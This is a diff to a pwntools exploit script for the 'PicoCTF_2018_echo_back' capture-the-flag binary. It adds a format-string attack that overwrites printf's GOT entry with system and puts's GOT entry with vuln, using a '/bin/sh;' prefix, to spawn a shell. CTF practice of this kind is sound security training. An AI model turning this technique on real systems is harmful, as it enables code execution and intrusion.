@@ -28,14 +28,25 @@ uu64    = lambda data               :u64(data.ljust(8,'\0'))
 leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
 
 context.log_level = 'DEBUG'
-binary = './pwn'
+binary = './PicoCTF_2018_echo_back'
 context.binary = binary
 elf = ELF(binary)
-p = remote('node3.buuoj.cn',29776) if argv[1]=='r' else process(binary)
+p = remote('node3.buuoj.cn', 29972) if argv[1]=='r' else process(binary)
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
 # start
+binsh = '/bin/sh;'
+def exec_fmt(payload):
+	io = remote('node3.buuoj.cn', 28796) if argv[1]=='r' else process(binary)
+	io.sendlineafter(':\n',binsh + payload)
+	return io.recv()
+auto = FmtStr(exec_fmt)
 
+payload = binsh + fmtstr_payload(auto.offset,{
+	elf.got['printf']:elf.plt['system'],
+	elf.got['puts']:elf.sym['vuln']
+},numbwritten=len(binsh))
+sla(':\n',payload)
 # end
 
 itr()
